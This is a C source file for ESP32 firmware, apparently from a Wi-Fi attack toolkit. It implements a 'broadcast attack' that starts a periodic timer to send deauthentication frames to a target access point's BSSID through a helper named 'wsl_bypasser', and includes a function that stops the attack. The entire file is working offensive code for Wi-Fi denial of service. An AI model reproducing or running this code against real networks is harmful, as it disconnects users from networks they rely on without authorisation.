#include "wifi_attack.h"

#include <string.h>

#include "esp_log.h"
#include "esp_err.h"
#include "wsl_bypasser.h"

static const char *TAG = "wifi_attack/broadcast";
static esp_timer_handle_t deauth_timer_handle;

static void timer_send_deauth_frame(void *arg) {
    wifi_attack_config_t *config = (wifi_attack_config_t *) arg;
    wsl_bypasser_send_deauth_frame(config->bssid);
}

void broadcast_request(wifi_attack_config_t *config) {
    ESP_LOGI(TAG, "Starting broadcast attack...");

    const esp_timer_create_args_t deauth_timer_args = {
            .callback = &timer_send_deauth_frame,
            .arg = (void *) config,
    };

    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, config->timeout * 1000000));
}

void broadcast_reset() {
    if (deauth_timer_handle == NULL) {
        return;
    }

    ESP_LOGI(TAG, "Stopping broadcast attack...");
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
    esp_timer_delete(deauth_timer_handle);
}
